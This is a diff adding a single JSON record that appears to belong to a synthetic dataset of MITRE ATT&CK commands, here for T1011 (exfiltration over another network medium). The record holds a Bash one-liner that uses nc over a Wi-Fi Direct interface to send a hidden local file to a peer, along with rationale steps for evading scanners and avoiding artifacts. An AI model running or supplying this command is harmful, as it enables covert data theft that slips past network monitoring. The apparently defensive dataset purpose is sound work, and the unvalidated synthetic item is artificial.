@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
+  "explanation": "Exfiltrates using a Wi\u2011Fi Direct (P2P) interface isolated from the corporate WLAN, with tcpdump passively observing only that TCP port. This leverages a distinct wireless medium per T1011.",
+  "rationale_steps": [
+    "Target the P2P Wi-Fi interface to avoid the primary Wi-Fi network.",
+    "Select uncommon port 55219 to evade common scanners.",
+    "Background tcpdump on the specific interface/port, no file artifacts.",
+    "Use nc with -s to bind to the P2P interface's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-8aafe9f5",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
